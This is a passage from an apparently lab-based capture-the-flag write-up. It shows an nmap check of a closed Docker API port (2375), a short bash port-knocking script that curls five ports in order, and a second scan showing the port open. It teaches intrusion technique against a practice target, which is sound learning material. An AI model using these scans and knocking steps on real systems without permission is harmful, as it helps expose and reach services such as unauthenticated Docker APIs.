<p>And we have flag for root flag. As we can see there is knocked ports. then i‚Äôm check the port of docker is off.</p>
<pre><code>$ nmap -p 2375 10.10.50.223 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 22:08 WIB
Nmap scan report for 10.10.50.223
Host is up (0.35s latency).

PORT     STATE  SERVICE
2375/tcp closed docker

Nmap done: 1 IP address (1 host up) scanned in 0.86 seconds
</code></pre>
<p>Now let‚Äôs knocking that ports then we will be able to access the docker. I‚Äôm make little script for knocking :</p>

<pre><code class="language-bash">#! /bin/bash
curl $1:42 -m 1
sleep 1
curl $1:1337 -m 1
sleep 1
curl $1:10420 -m 1
sleep 1
curl $1:6969 -m 1
sleep 1
curl $1:63000 -m 1
</code></pre>
<p>Let‚Äôs run this : <code>./knock 10.10.50.223</code>. After run we check again the port of docker</p>
<pre><code>$ nmap -p 2375 10.10.50.223
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 22:15 WIB
Nmap scan report for 10.10.50.223
Host is up (0.47s latency).

PORT     STATE SERVICE
2375/tcp open  docker

Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
</code></pre>
